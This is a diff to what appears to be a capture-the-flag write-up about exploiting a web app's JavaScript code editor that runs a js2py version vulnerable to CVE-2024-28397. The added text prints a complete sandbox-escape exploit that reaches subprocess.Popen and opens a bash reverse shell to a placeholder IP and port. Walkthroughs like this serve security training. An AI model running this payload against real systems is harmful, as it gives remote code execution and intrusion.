@@ -37,8 +37,28 @@ js2py==0.74</code></pre>
 <br>
 It contains a vulnerable version of <b>js2py</b> to <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28397">CVE-2024–28397</a>. <br>
 After we register and log in on the web app, there is a Code Editor that allows us to run JavaScript code, we can read the source code from the zip of the app we downloaded, but it was pretty obvious that here is the place where the vulnerable
-version of <b>js2py</b> is being used.
+version of <b>js2py</b> to sandbox-escape is being used.
 <img width="978" height="896" alt="image" src="https://github.com/user-attachments/assets/a1d2ea57-dbb4-4f55-88a3-aaad85e2583e" />
-
+<br>
+I used the publicly available code for the sandbox-escape to spawn the shell for us:
+<pre><code class="language-js">let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/{YOUR_IP}/{LISTENER_PORT} 0>&1'"
+let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
+let obj = a(a(a,"__class__"), "__base__")
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(result)
+result</code></pre>
+<br>
 
 
